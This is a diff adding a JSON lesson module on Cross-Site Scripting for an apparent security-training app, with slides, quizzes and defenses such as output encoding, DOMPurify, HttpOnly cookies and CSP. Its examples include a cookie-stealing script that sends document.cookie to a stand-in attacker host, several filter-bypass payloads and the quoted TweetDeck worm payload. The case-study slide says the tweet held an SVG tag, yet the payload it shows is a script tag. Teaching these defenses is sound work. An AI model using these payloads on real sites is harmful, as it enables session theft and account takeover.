@@ -1,0 +1,159 @@
+{
+    "id": "learn_ws_xss",
+    "topicId": "ws_xss",
+    "topicTitle": "Cross-Site Scripting (XSS)",
+    "description": "Master Cross-Site Scripting (XSS): Stored, Reflected, DOM-based XSS, context-aware output encoding, DOMPurify sanitization, and HttpOnly cookies.",
+    "baseKP": 100,
+    "slides": [
+        {
+            "id": "ws_xss_1",
+            "type": "content",
+            "title": "Introduction to Cross-Site Scripting (XSS)",
+            "content": "# Cross-Site Scripting (XSS) 🕷️\n\n**Cross-Site Scripting (XSS)** is an injection vulnerability that occurs when a web application takes untrusted user input and renders it directly into a web page without adequate validation or encoding.\n\nThis allows malicious actors to inject client-side scripts (typically JavaScript) into web pages viewed by other users.\n\n## What Attackers Can Do With XSS\n\n- 🍪 **Steal Session Cookies**: Hijack legitimate logged-in user accounts.\n- 🎣 **Phishing & UI Redirection**: Inject fake login forms over real banking sites.\n- ⚡ **Perform Actions as the Victim**: Post status updates, transfer money, change passwords.\n- ⌨️ **Keystroke Logging**: Record everything the victim types.\n- 📸 **Webcam & Location Access**: Abuse browser device permissions."
+        },
+        {
+            "id": "ws_xss_2",
+            "type": "content",
+            "title": "The Three Types of XSS",
+            "content": "# The Three Categories of XSS 📐\n\nXSS attacks fall into three primary categories based on how the malicious payload reaches the victim's browser:\n\n## 1. Stored XSS (Persistent)\nThe malicious script is permanently stored in the application's database (e.g. forum post, user profile bio, comment).\n\n## 2. Reflected XSS (Non-Persistent)\nThe malicious script is reflected off the web server in an immediate HTTP response (e.g. search term, error message in URL parameter).\n\n## 3. DOM-Based XSS (Client-Side)\nThe vulnerability exists entirely in client-side JavaScript that writes untrusted data into the Document Object Model (DOM) using unsafe sinks like `innerHTML`."
+        },
+        {
+            "id": "ws_xss_3",
+            "type": "content",
+            "title": "Stored XSS (Persistent XSS)",
+            "content": "# Stored XSS (Persistent) 💾\n\nStored XSS is the most dangerous form of XSS because a single payload can infect thousands of victims automatically.\n\n## Attack Scenario: The Malicious Blog Comment\n\n1. Attacker posts a comment containing JavaScript:\n   ```html_not\n   Great article! <script>fetch('https://attacker.com/steal?cookie=' + document.cookie);</script>\n   ```\n2. The server blindly saves this string into the comments database table.\n3. An innocent visitor (or site administrator) views the article.\n4. The server outputs the comment into the HTML page.\n5. The victim's browser parses the `<script>` tag as executable code and transmits their session cookie directly to the attacker!"
+        },
+        {
+            "id": "ws_xss_4",
+            "type": "content",
+            "title": "Reflected XSS (Non-Persistent)",
+            "content": "# Reflected XSS 🪞\n\nIn Reflected XSS, the payload travels from the request directly into the immediate response without being stored in a database.\n\n## Attack Scenario: The Search Page\n\n1. A website has a search feature: `https://site.com/search?q=laptops`.\n2. The server outputs: `<h3>Search results for: laptops</h3>`.\n3. If the server does not encode the query parameter, the attacker crafts a malicious link:\n   ```http_not\n   https://site.com/search?q=<script>alert(document.domain)</script>\n   ```\n4. The attacker tricks a victim into clicking this link via email or social media.\n5. The server echoes the script into the page, executing in the context of the victim's session!"
+        },
+        {
+            "id": "ws_xss_quiz_1",
+            "type": "quiz",
+            "title": "Stored vs Reflected Check",
+            "content": "Test your understanding of XSS classifications!",
+            "quizQuestion": "Which type of XSS attack is permanently stored in a database and executes whenever any user visits the infected page?",
+            "quizOptions": [
+                "Reflected XSS",
+                "Stored (Persistent) XSS",
+                "DOM-based XSS",
+                "Blind SQL Injection"
+            ],
+            "correctOptionIndex": 1
+        },
+        {
+            "id": "ws_xss_6",
+            "type": "content",
+            "title": "DOM-Based XSS",
+            "content": "# DOM-Based XSS 🌲\n\nIn DOM-based XSS, the attack payload is processed **entirely within the browser client** by JavaScript. The server might not even receive or see the payload!\n\n## How DOM XSS Happens: Sources & Sinks\n\n- **Source**: An input that reads untrusted data (e.g. `location.search`, `location.hash`, `document.referrer`).\n- **Sink**: A dangerous JavaScript API that executes strings as HTML or code.\n\n## Vulnerable Code Example ❌\n\n```javascript_not\n// URL: https://site.com/welcome.html#<img src=x onerror=alert(1)>\nconst hash = decodeURIComponent(window.location.hash.substring(1));\n\n// VULNERABLE SINK: innerHTML parses the string as raw DOM markup!\ndocument.getElementById('greeting').innerHTML = \"Hello, \" + hash;\n```"
+        },
+        {
+            "id": "ws_xss_7",
+            "type": "content",
+            "title": "Dangerous Sinks & Safe Alternatives",
+            "content": "# Dangerous Sinks vs Safe DOM APIs 🛡️\n\nAudit your frontend JavaScript for dangerous sinks and replace them with safe property setters.\n\n## Dangerous Sinks (Avoid!) ❌\n\n- `element.innerHTML = userInput;`\n- `element.outerHTML = userInput;`\n- `document.write(userInput);`\n- `eval(userInput);`\n- `setTimeout(userInput, 1000);`\n\n## Safe DOM Alternatives (Use!) ✅\n\n- `element.textContent = userInput;` (Treats input strictly as text, never code!)\n- `element.innerText = userInput;`\n- `element.setAttribute('data-id', userInput);`"
+        },
+        {
+            "id": "ws_xss_8",
+            "type": "content",
+            "title": "XSS Attack Vectors Beyond `<script>`",
+            "content": "# Sneaky XSS Vectors: Beyond `<script>` 🕵️\n\nNaive filters try to block `<script>`. Attackers easily bypass this using HTML event handlers and attributes!\n\n## 1. Image Error Handlers\n\n```html_not\n<img src=\"invalid-image.jpg\" onerror=\"alert('XSS Executed!')\">\n```\n\n## 2. SVG Payloads\n\n```html_not\n<svg onload=\"alert(document.cookie)\"></svg>\n```\n\n## 3. JavaScript Pseudo-URLs in Anchors\n\n```html_not\n<a href=\"javascript:alert('XSS')\">Click here for coupon</a>\n```\n\n## 4. Body Event Handlers\n\n```html_not\n<body onload=\"alert('XSS')\">\n```\n\n> ⚠️ **Lesson:** Never attempt to build custom \"blocklists\" for `<script>`. Blacklisting fails against creative attacker encoding!"
+        },
+        {
+            "id": "ws_xss_quiz_2",
+            "type": "quiz",
+            "title": "Safe DOM Sinks Quiz",
+            "content": "Test your knowledge of DOM security!",
+            "quizQuestion": "Which JavaScript DOM property is completely safe against XSS because it treats user input purely as text?",
+            "quizOptions": [
+                "`element.innerHTML`",
+                "`element.outerHTML`",
+                "`element.textContent`",
+                "`document.write()`"
+            ],
+            "correctOptionIndex": 2
+        },
+        {
+            "id": "ws_xss_10",
+            "type": "content",
+            "title": "Prevention: Context-Aware Output Encoding",
+            "content": "# Primary Defense: Context-Aware Output Encoding 🛡️\n\n**Output Encoding** converts potentially dangerous characters into safe, harmless display representations before rendering them.\n\n## HTML Entity Encoding Table\n\n| Raw Character | HTML Entity | Prevents |\n|---|---|---|\n| `<` | `&lt;` | Tag creation (`<script>`, `<img>`) |\n| `>` | `&gt;` | Tag closing |\n| `&` | `&amp;` | Entity confusion |\n| `\"` | `&quot;` | Breaking out of HTML attributes |\n| `'` | `&#x27;` | Breaking out of single-quoted attributes |\n| `/` | `&#x2F;` | Closing HTML tags |\n\nWhen encoded, browser renders `&lt;script&gt;` visually as literal text without executing it!"
+        },
+        {
+            "id": "ws_xss_11",
+            "type": "content",
+            "title": "Context Matters: HTML, Attributes, JS Context",
+            "content": "# Why Encoding Must Match Context 🎯\n\nHTML entity encoding is NOT sufficient if data is rendered inside a `<script>` tag or attribute!\n\n## 1. HTML Body Context\n\n```html_not\n<!-- Safe with HTML Entity Encoding -->\n<div>&lt;b&gt;Hello&lt;/b&gt;</div>\n```\n\n## 2. JavaScript Context\n\nInside `<script>`, HTML entities do NOT prevent execution:\n\n```html_not\n<!-- VULNERABLE: Attacker breaks out of quotation! -->\n<script>\n  const username = \"'; alert(1); //\"; \n</script>\n```\n\n**Rule:** Inside JavaScript, always serialize data with `JSON.stringify()`!"
+        },
+        {
+            "id": "ws_xss_12",
+            "type": "content",
+            "title": "Prevention: HTML Sanitization with DOMPurify",
+            "content": "# Rich Text Sanitization with DOMPurify 🧼\n\nWhat if your application *must* allow users to format comments with bold text (`<b>`), links (`<a>`), and lists (`<ul>`)?\n\nYou cannot use raw HTML entity encoding. You need an **HTML Sanitizer**.\n\n## Enter DOMPurify\n\n**DOMPurify** parses HTML into a DOM tree, strips all executable tags (`<script>`, `<iframe>`), dangerous attributes (`onerror`, `onclick`), and pseudo-protocols (`javascript:`):\n\n```javascript_not\nimport DOMPurify from 'dompurify';\n\nconst dirtyHtml = \"<p>Welcome! <img src=x onerror=alert(1)> <b>User</b></p>\";\nconst cleanHtml = DOMPurify.sanitize(dirtyHtml);\n\n// Output: <p>Welcome! <img src=\"x\"> <b>User</b></p>\ndocument.getElementById('content').innerHTML = cleanHtml; // SAFE!\n```"
+        },
+        {
+            "id": "ws_xss_13",
+            "type": "content",
+            "title": "Modern Frontend Framework Protections",
+            "content": "# How React, Vue & Angular Protect You 🛡️\n\nModern frontend frameworks automatically encode data bound to templates by default.\n\n## React's Automatic Protection\n\n```javascript_not\n// React automatically escapes string values:\nconst title = \"<script>alert(1)</script>\";\nreturn <h1>{title}</h1>; // SAFE: React renders literal string!\n```\n\n## The Framework Escape Hatches (Danger Zone!)\n\nFrameworks provide explicit, deliberately scary escape hatches when raw HTML is required:\n\n- React: `dangerouslySetInnerHTML={{ __html: sanitize(data) }}`\n- Vue: `v-html=\"sanitize(data)\"`\n- Angular: `[innerHTML]=\"data\"` (with `DomSanitizer`)\n\n> ⚠️ **Rule:** Whenever using these escape hatches, always sanitize with DOMPurify first!"
+        },
+        {
+            "id": "ws_xss_14",
+            "type": "content",
+            "title": "Protecting Cookies with HttpOnly",
+            "content": "# Mitigating Cookie Theft: `HttpOnly` Flag 🍪\n\nThe primary objective of most XSS attacks is stealing authentication session cookies via `document.cookie`.\n\n## The `HttpOnly` Directive\n\nWhen a web server sets a cookie with the `HttpOnly` flag, the browser **completely forbids client-side JavaScript from accessing it**:\n\n```http_not\nSet-Cookie: session_id=abc123xyz; Secure; HttpOnly; SameSite=Strict\n```\n\nEven if an attacker finds an XSS vulnerability on your site, `document.cookie` will return an empty string and the attacker cannot steal your session token!"
+        },
+        {
+            "id": "ws_xss_15",
+            "type": "content",
+            "title": "Content Security Policy (CSP) as a Safety Net",
+            "content": "# Content Security Policy (CSP) for XSS Defense 📜\n\n**Content Security Policy (CSP)** is an HTTP response header that restricts where scripts can be loaded and executed from.\n\n## A Robust Anti-XSS CSP Policy\n\n```http_not\nContent-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; object-src 'none';\n```\n\n## What this CSP Blocks:\n\n- ❌ Inline scripts like `<script>alert(1)</script>`\n- ❌ Inline event handlers like `<img onerror=\"...\">`\n- ❌ Scripts loaded from untrusted third-party domains (`https://evil.com/hack.js`)\n- ❌ String evaluation like `eval()`"
+        },
+        {
+            "id": "ws_xss_16",
+            "type": "content",
+            "title": "Input Validation vs Output Encoding",
+            "content": "# Input Validation vs Output Encoding ⚖️\n\nSecurity engineers enforce both, but understand their different purposes:\n\n## Input Validation (Allowlisting)\n\n- Reject data that doesn't conform to expected formats (e.g. email must match regex, age must be integer).\n- **Limitation**: Cannot prevent XSS alone because names like `O'Connor` or mathematical text contain quotes or brackets.\n\n## Output Encoding (Contextual)\n\n- Formats data so the browser's HTML parser treats it strictly as display characters.\n- **The Golden Rule**: Validate on input; Encode on output!"
+        },
+        {
+            "id": "ws_xss_17",
+            "type": "content",
+            "title": "Real-World Vulnerability Case Study: TweetDeck Worm",
+            "content": "# Case Study: The 2014 TweetDeck XSS Worm 🐛\n\nIn June 2014, a teenager discovered an XSS vulnerability in Twitter's TweetDeck desktop client.\n\n## The Payload\n\nA tweet containing an SVG tag was posted:\n\n```html_not\n<script class=\"xss\">$(\".xss\").parents().eq(1).find(\"a\").eq(1).click();$('[data-action=retweet]').click();alert('XSS in Tweetdeck')</script>♥\n```\n\n## The Propagation Effect\n\nWhenever any TweetDeck user scrolled past this tweet in their feed, the script executed automatically in their client, silently retweeting the exact same payload to all their followers!\n\nWithin minutes, the self-propagating worm was retweeted **over 40,000 times**, forcing Twitter to take TweetDeck offline temporarily."
+        },
+        {
+            "id": "ws_xss_quiz_3",
+            "type": "quiz",
+            "title": "Cookie Security Flag Quiz",
+            "content": "Test your knowledge of cookie protection!",
+            "quizQuestion": "Which cookie flag prevents JavaScript code from reading the cookie via `document.cookie`?",
+            "quizOptions": [
+                "`Secure`",
+                "`HttpOnly`",
+                "`SameSite=Lax`",
+                "`Domain=Strict`"
+            ],
+            "correctOptionIndex": 1
+        },
+        {
+            "id": "ws_xss_19",
+            "type": "content",
+            "title": "XSS Remediation Checklist",
+            "content": "# XSS Remediation Checklist 📋\n\n- [x] **Store auth tokens in `HttpOnly; Secure` cookies**: Never store sensitive tokens in `localStorage`.\n- [x] **Sanitize user HTML with DOMPurify**: Clean rich-text inputs before rendering.\n- [x] **Use safe DOM APIs**: Use `textContent` instead of `innerHTML`.\n- [x] **Deploy a strict Content Security Policy**: Disallow `'unsafe-inline'`.\n- [x] **Leverage framework template escaping**: Avoid bypasses like `dangerouslySetInnerHTML`."
+        },
+        {
+            "id": "ws_xss_20",
+            "type": "content",
+            "title": "Summary: Cross-Site Scripting",
+            "content": "# Cross-Site Scripting (XSS): Summary 📋\n\n## Key Takeaways\n- **Three Types**: Stored (database), Reflected (URL parameters), and DOM-based (client sinks).\n- **Dangerous Sinks**: `innerHTML`, `outerHTML`, and `document.write` execute untrusted code.\n- **Output Encoding**: Encodes `< > & \" '` to neutralize malicious markup.\n- **DOMPurify**: Essential for sanitizing allowed rich-text HTML.\n- **Defense in Depth**: Pair encoding with `HttpOnly` cookie flags and Content Security Policy.\n\nNext: Master Cross-Site Request Forgery (CSRF) and Clickjacking! 🎭"
+        },
+        {
+            "id": "ws_xss_21",
+            "type": "content",
+            "title": "Next Steps: CSRF & Clickjacking",
+            "content": "# Ahead: CSRF & Clickjacking 🎭🖱️\n\nWhile XSS runs malicious scripts *inside* your site, CSRF tricks the user's browser into sending unauthorized requests *from another site*.\n\n## Topics Ahead:\n- **How CSRF Works**: Exploiting ambient browser cookie credentials\n- **Anti-CSRF Tokens**: The Synchronizer Token Pattern\n- **SameSite Cookie Attributes**: `Strict`, `Lax`, and `None`\n- **Clickjacking & Frame Busting**: `X-Frame-Options` and CSP `frame-ancestors`\n\nLet's master request forgery defenses! 🚀"
+        }
+    ]
+}
